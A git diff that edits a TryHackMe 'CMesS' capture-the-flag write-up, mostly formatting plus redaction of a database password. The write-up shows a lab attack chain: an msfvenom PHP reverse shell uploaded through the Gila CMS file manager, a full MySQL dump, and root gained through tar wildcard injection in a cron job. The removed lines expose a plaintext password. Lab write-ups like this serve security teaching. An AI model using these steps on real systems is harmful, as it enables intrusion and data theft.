@@ -7,7 +7,9 @@ Welcome to my another writeup! In this TryHackMe [CMesS](https://tryhackme.com/r
 ## Background:
 
 > Can you root this Gila CMS box?
-> Please add `MACHINE_IP_ADDRESS` cmess.thm to `/etc/hosts`
+
+> Please add `MACHINE_IP_ADDRESS` cmess.thm to `/etc/hosts`.
+
 > Please also note that this box does not require brute forcing!
 
 ## Difficulty:
@@ -89,7 +91,7 @@ dev                     [Status: 200, Size: 934, Words: 191, Lines: 31, Duration
 
 We found `dev` subdomain.
 
-Add `dev.cmess.thm` in `/etc/hosts`
+Add `dev.cmess.thm` in `/etc/hosts`.
 ```
 ┌──(root💀nam)-[~/ctf/thm/ctf/CMesS]
 └─# nano /etc/hosts       
@@ -106,7 +108,7 @@ ff02::2 ip6-allrouters
 
 ![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a1.png)
 
-Since we now have the andre creds, we can login to the Gila CMS admin panel with his email and password.
+Since we now have the andre credential, we can login to the Gila CMS admin panel with his email and password.
 
 ![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a2.png)
 
@@ -114,15 +116,15 @@ Since we now have the andre creds, we can login to the Gila CMS admin panel with
 
 # Initial Shell:
 
-Now we have control of the admin panel, we can now upload a reverse shell in `Content` -> `File Manager`
+Now we have control of the admin panel, we can now upload a reverse shell in `Content` -> `File Manager`.
 
 ![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a4.png)
 
-First, generate a php reverse shell via msfvenom:
+First, generate a php reverse shell via `msfvenom`:
 
 ```
 ┌──(root💀nam)-[~/ctf/thm/ctf/CMesS]
-└─# msfvenom -p php/reverse_php LHOST=10.18.61.134 LPORT=443 -o shell.php
+└─# msfvenom -p php/reverse_php LHOST=tun0 LPORT=443 -o shell.php
 [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
 [-] No arch selected, selecting arch: php from the payload
 No encoder specified, outputting raw payload
@@ -157,7 +159,7 @@ In the "File Manager", we can also see there is a `config.php` file, which conta
 
 We can now login into MySQL database and dump the entire database:
 
-`mysqldump -uroot -pr0otus3rpassw0rd --all-databases > /var/www/html/assets/databases.sql`
+`mysqldump -uroot -p[redacted] --all-databases > /var/www/html/assets/databases.sql`
 
 Now we can download the databases via `wget`:
 
@@ -190,20 +192,9 @@ By doing manual enumeration, I found that there is one cronjob is running every 
 
 ```bash
 andre@cmess:~$ cat /etc/crontab
-# /etc/crontab: system-wide crontab
-# Unlike any other crontab you don't have to run the `crontab'
-# command to install the new version when you edit this file
-# and files in /etc/cron.d. These files also have username fields,
-# that none of the other crontabs do.
-
-SHELL=/bin/sh
-PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-
+...
 # m h dom mon dow user	command
-17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
-25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
-47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
-52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+...
 */2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
 ```
 
@@ -217,7 +208,7 @@ To do so, we can write a bash reverse shell, and create two files: `--checkpoint
 
 ![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a16.png)
 
-Proof-of-Concept:
+**Proof-of-Concept:**
 
 ![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a18.png)
 
@@ -227,7 +218,7 @@ Proof-of-Concept:
 
 # Conclusion
 
-**What we've learned:**
+What we've learned:
 
 1. Subdomain enumeration
 2. Abusing Gila CMS to gain an initial shell
